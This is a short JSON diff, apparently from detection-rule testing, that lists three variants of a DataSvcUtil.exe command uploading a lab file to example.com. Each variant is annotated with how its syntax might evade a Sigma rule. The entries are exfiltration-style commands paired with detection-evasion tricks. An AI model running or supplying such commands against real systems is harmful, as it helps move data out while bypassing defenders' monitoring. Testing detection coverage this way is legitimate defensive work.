@@ -1,0 +1,14 @@
+[
+  {
+    "output": "DataSvcUtil.exe /uri:http://example.com /in:C:\\Lab\\input\\sample.txt /out:C:\\Lab\\out\\archive.7z",
+    "explanation": "Insertion of quotes and spaces; the Sigma rule may miss the command if the arguments are not properly quoted or if the command line is restructured."
+  },
+  {
+    "output": "DataSvcUtil.exe -uri http://example.com -in C:\\Lab\\input\\sample.txt -out C:\\Lab\\out\\archive.7z",
+    "explanation": "Substitution of short/long options; the Sigma rule may not detect the command if it uses alternative syntax for the same parameters."
+  },
+  {
+    "output": "DataSvcUtil.exe /in:C:\\Lab\\input\\sample.txt /out:C:\\Lab\\out\\archive.7z /uri:http://example.com",
+    "explanation": "Reordering of arguments; the Sigma rule may not detect the command if the order of the arguments is changed but the functionality remains the same."
+  }
+]
